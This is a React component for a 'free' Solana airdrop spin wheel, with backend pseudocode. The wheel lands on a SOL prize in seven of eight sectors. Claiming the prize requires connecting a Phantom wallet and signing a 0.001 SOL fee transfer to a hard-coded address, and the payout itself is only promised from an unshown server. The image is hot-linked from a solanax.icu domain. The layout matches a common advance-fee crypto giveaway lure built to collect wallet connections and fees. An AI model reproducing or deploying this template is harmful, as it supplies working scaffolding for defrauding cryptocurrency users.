# freesolana-airdrop
import React, { useEffect, useRef, useState } from "react"; import { PublicKey, Connection, clusterApiUrl, SystemProgram, Transaction, LAMPORTS_PER_SOL } from "@solana/web3.js";

// SOL SPIN - English UI // Wheel image: https://solanax.icu/l/solana-spin/assets/img/wheel_wheel.png

export default function SolSpin() { // --- CONFIG --- const RPC = clusterApiUrl("mainnet-beta"); const PLATFORM_RECEIVER = new PublicKey("Aif28gDfCKAXxJamRcLLmoo5TsCeAYhk5V8RxdzjpSEW"); const PLATFORM_FEE_SOL = 0.001; // claim fee const connection = useRef(new Connection(RPC, "confirmed"));

// --- wheel sectors (visual only) --- const prizes = [ { id: 1, label: "REWARD ALL x2", kind: "reward", amount: 0 }, { id: 2, label: "0.5 SOLANA", kind: "sol", amount: 0.5 }, { id: 3, label: "1 SOLANA", kind: "sol", amount: 1 }, { id: 4, label: "5 SOLANA", kind: "sol", amount: 5 }, { id: 5, label: "2.5 SOLANA", kind: "sol", amount: 2.5 }, { id: 6, label: "0.3 SOLANA", kind: "sol", amount: 0.3 }, { id: 7, label: "1 SOLANA", kind: "sol", amount: 1 }, { id: 8, label: "1.5 SOLANA", kind: "sol", amount: 1.5 }, ];

// --- state --- const [angle, setAngle] = useState(0); const [spinning, setSpinning] = useState(false); const [result, setResult] = useState(null); const [walletPubkey, setWalletPubkey] = useState(null);

// --- Phantom helpers --- const isPhantomInstalled = () => !!window.solana && window.solana.isPhantom;

const connectWallet = async () => { if (!isPhantomInstalled()) return alert("Phantom wallet not found. Please install Phantom."); try { const resp = await window.solana.connect(); setWalletPubkey(resp.publicKey.toString()); } catch (err) { console.error(err); alert('Failed to connect to wallet.'); } };

const disconnectWallet = async () => { try { await window.solana.disconnect(); setWalletPubkey(null); } catch (err) { console.error(err); } };

// --- spin logic --- const spin = async () => { if (spinning) return; setResult(null); setSpinning(true);

const idx = Math.floor(Math.random() * prizes.length);
const sectorAngle = 360 / prizes.length;
const rounds = 6 + Math.floor(Math.random() * 4);
const randomOffset = Math.random() * sectorAngle;
const target = rounds * 360 + (idx * sectorAngle) + (sectorAngle / 2 - randomOffset);

setAngle(target);
await new Promise((r) => setTimeout(r, 5800));

const prize = prizes[idx];
setResult(prize);
setSpinning(false);

};

// --- claim: user signs a transfer of 0.001 SOL to PLATFORM_RECEIVER --- const claim = async () => { if (!result || result.kind !== 'sol') return alert('No claimable SOL prize.'); if (!isPhantomInstalled()) return alert('Phantom wallet not found.');

try {
  if (!walletPubkey) {
    const ok = window.confirm('You must connect your wallet to claim. Connect now?');
    if (!ok) return;
    await connectWallet();
  }

  const provider = window.solana;
  const fromPubkey = provider.publicKey;

  const feeLamports = Math.round(PLATFORM_FEE_SOL * LAMPORTS_PER_SOL);
  const tx = new Transaction().add(
    SystemProgram.transfer({ fromPubkey, toPubkey: PLATFORM_RECEIVER, lamports: feeLamports })
  );

  tx.feePayer = fromPubkey;
  tx.recentBlockhash = (await connection.current.getRecentBlockhash()).blockhash;

  const signed = await provider.signTransaction(tx);
  const raw = signed.serialize();
  const feeTxSig = await connection.current.sendRawTransaction(raw);
  await connection.current.confirmTransaction(feeTxSig, 'confirmed');

  // Notify backend to verify and payout
  await fetch('/api/claim', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ prize: result, userPubkey: fromPubkey.toString(), feeTxSig }),
  });

  alert('Fee transaction sent. Backend will verify and send your prize if valid.');
  setResult(null);
} catch (err) {
  console.error(err);
  alert('Transaction cancelled or failed.');
}

};

// --- UI --- return ( <div style={{ background: '#000', minHeight: '100vh', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}> <div style={{ width: 520, textAlign: 'center' }}> <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}> <h2 style={{ fontSize: 28, letterSpacing: 1 }}>Solana Airdrop Wheel</h2> <div> {walletPubkey ? ( <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}> <span style={{ fontSize: 12 }}>{walletPubkey.slice(0,6)}...{walletPubkey.slice(-4)}</span> <button onClick={disconnectWallet} style={{ padding: '6px 10px', borderRadius: 8, background: '#222', color: '#fff', border: 'none' }}>Disconnect</button> </div> ) : ( <button onClick={connectWallet} style={{ padding: '8px 12px', borderRadius: 8, background: '#7b2cff', color: '#fff', border: 'none' }}>Connect Wallet</button> )} </div> </div>

<div style={{ position: 'relative', width: 480, height: 480, margin: '0 auto' }}>
      <div style={{ position: 'absolute', left: '50%', top: -18, transform: 'translateX(-50%)' }}>
        <div style={{ width: 0, height: 0, borderLeft: '22px solid transparent', borderRight: '22px solid transparent', borderBottom: '20px solid #d6c8ff' }} />
      </div>

      <img
        src="https://solanax.icu/l/solana-spin/assets/img/wheel_wheel.png"
        alt="wheel"
        style={{ width: '100%', height: '100%', borderRadius: '9999px', transform: `rotate(${angle}deg)`, transition: spinning ? 'transform 5.8s cubic-bezier(.17,.67,.31,1)' : 'transform 0.2s linear', boxShadow: '0 10px 40px rgba(0,0,0,0.6)' }}
      />
    </div>

    <div style={{ marginTop: 18 }}>
      <button onClick={spin} disabled={spinning} style={{ padding: '12px 28px', borderRadius: 999, background: 'linear-gradient(90deg,#7b2cff,#5a22d6)', border: 'none', color: '#fff', fontSize: 16 }}>FREE SPIN</button>
    </div>

    {result && (
      <div style={{ marginTop: 18, background: '#111', padding: 14, borderRadius: 12 }}>
        <div style={{ fontSize: 18, fontWeight: 600 }}>You won: {result.label}</div>
        {result.kind === 'sol' && (
          <div style={{ marginTop: 10 }}>
            <button onClick={claim} style={{ padding: '10px 18px', borderRadius: 8, border: 'none', background: '#16a34a', color: '#fff' }}>Claim</button>
          </div>
        )}
      </div>
    )}

    <div style={{ marginTop: 14, fontSize: 12, color: '#aaa' }}>
      <div>Fee receiver: {PLATFORM_RECEIVER.toString()}</div>
      <div>Claim fee: {PLATFORM_FEE_SOL} SOL</div>
    </div>
  </div>
</div>

); }

/* --------------------------------------------------------------------------- BACKEND PSEUDOCODE / INSTRUCTIONS (must run on your server)

Endpoint: POST /api/claim Body: { prize: {id,label,kind,amount}, userPubkey, feeTxSig }


Steps the server must do:

1. Check feeTxSig not processed before (store in DB to prevent replays).


2. connection.getParsedTransaction(feeTxSig, 'confirmed') and verify:

tx exists and meta.err === null

contains a 'system' transfer instruction where destination == PLATFORM_RECEIVER && lamports == 0.001*LAMPORTS_PER_SOL

extract sender address from instruction (source)



3. (Optional) check slot/blockTime recency and confirmations


4. If valid, construct and send a transfer transaction from your PLATFORM_KEYPAIR to the sender address of amount = prize.amount * LAMPORTS_PER_SOL


5. Save records (feeTxSig, payoutTxSig, paidTo, prize.amount, timestamps)



SECURITY NOTES: - PLATFORM_KEYPAIR must be stored only on server (env var or secret manager). Never expose private keys in frontend. - Use persistent DB (Postgres/Redis) to track used feeTxSig and prevent race/replay. - Apply rate-limits and monitoring. Consider KYC/limits to prevent abuse.

*/
